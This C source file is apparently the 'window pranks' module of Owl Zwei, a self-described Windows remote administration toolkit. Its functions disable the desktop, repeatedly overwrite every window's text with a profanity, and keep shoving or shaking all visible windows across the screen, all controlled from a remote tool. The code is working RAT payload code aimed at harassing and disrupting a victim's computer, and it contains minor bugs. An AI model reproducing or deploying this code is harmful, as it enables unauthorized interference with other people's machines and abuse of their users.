/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "windowpranks.h"

char		 *szFUStr = "Fuck You!!";
bool		 bCtrlFU = false;
bool		 bCtrlMakeWindowsRun = false;
int			 nRunWindowsEffect = false;
unsigned int uiRunWindowsDelay = 2000 ;
bool	     bCtrlQuake = false;
unsigned int uiQuakeDelay = 0;
/*********************************************************************************************/
void EnableDesktop( bool enable ){
	EnableWindow( GetDesktopWindow() , enable ? TRUE : FALSE );
}
/*********************************************************************************************/
void FuckYou( bool start ){

	if( start && !bCtrlFU ){

		new_thread( fuckYouProc , NULL );
		bCtrlFU = start;
	
	}else if( !start )
		bCtrlFU = false;

}
/*********************************************************************************************/
DWORD WINAPI fuckYouProc( LPVOID ptr ){
	
	while( bCtrlFU )
		EnumWindows( &EnumFU , 0 );

	return 0;
}
/*********************************************************************************************/
BOOL CALLBACK EnumFU( HWND hWnd , LPARAM lParam ){

	if( !hWnd ) return TRUE;

	SendMessage( hWnd , WM_SETTEXT , 0 , LPARAM( LPCTSTR( szFUStr ) ) );
	EnumChildWindows( hWnd , &EnumChildrenFU , 0 );

	return TRUE;

}
/*********************************************************************************************/

BOOL CALLBACK EnumChildrenFU( HWND hWnd , LPARAM lParam ){

	if( !hWnd ) return TRUE;

	SendMessage( hWnd , WM_SETTEXT , 0 , LPARAM( LPCTSTR( szFUStr ) ) );

	return TRUE;
}
/*********************************************************************************************/
void MakeWindowsRun( bool start ){
	
	if( !bCtrlMakeWindowsRun && start )
		new_thread( WRunProc , NULL );
	bCtrlMakeWindowsRun = start;

}
/*********************************************************************************************/
DWORD WINAPI WRunProc( LPVOID ptr ){

	HANDLE h = CreateEvent( NULL , TRUE , FALSE , "delrn" );
	
	int t = GetSystemMetrics( SM_CXSCREEN );

	while( bCtrlMakeWindowsRun ){
		int nWnd;
		
		HWND wndList[64];
		HWND w;
		RECT r;

		for( int i = 0 ; i < t ; i++ ){

			nWnd = 0;
			w = GetWindow( GetDesktopWindow() , GW_CHILD );

			while( w ){

				if( IsWindowVisible( w ) )
					wndList[ nWnd++ ] = w;

				w = GetWindow( w , GW_HWNDNEXT );
			}

			HDWP mv = BeginDeferWindowPos( nWnd );

			for( int j = 0 ; j < nWnd ; j++ ){

				GetWindowRect( wndList[j] , &r );
				mv = DeferWindowPos( mv , wndList[j] , HWND_BOTTOM , (r.left - 10) , r.top ,
																     ( r.right - r.left ),
																	 ( r.bottom - r.top ),
															(SWP_NOACTIVATE || SWP_NOZORDER)
																);
			}
			EndDeferWindowPos( mv );
		}

		WaitForSingleObject( h , 2000 );
	}
	return 0;

}
/*********************************************************************************************/

void Quake( bool start ){

	if( start && !bCtrlQuake )
		new_thread( quakeProc , NULL );
	bCtrlQuake = start;

}
/*********************************************************************************************/
DWORD WINAPI quakeProc( LPVOID ptr ){

	while( bCtrlQuake )
		EnumWindows( &EnumQuake , 0 );

	return 0;

}
/*********************************************************************************************/
BOOL CALLBACK EnumQuake( HWND hWnd , LPARAM lParam ){

	if( !IsWindowVisible( hWnd ) ) return TRUE;

	RECT r;

	GetWindowRect( hWnd , &r );
	
	int d = rand() % 4;
	switch(d){
	
	case 0: 
		r.top += 4;
		r.left += 4;
		break;
	case 1:
		r.right += 4;
		r.bottom += 4;
		break;
	case 2:
		r.right -= 4;
		r.bottom -= 4;
	case 3:
		r.top -= 4;
		r.left -= 4;
		break;
	}

	MoveWindow( hWnd , r.left , r.top , r.right - r.left , r.bottom - r.top , TRUE );

	return TRUE;

}
/*********************************************************************************************/
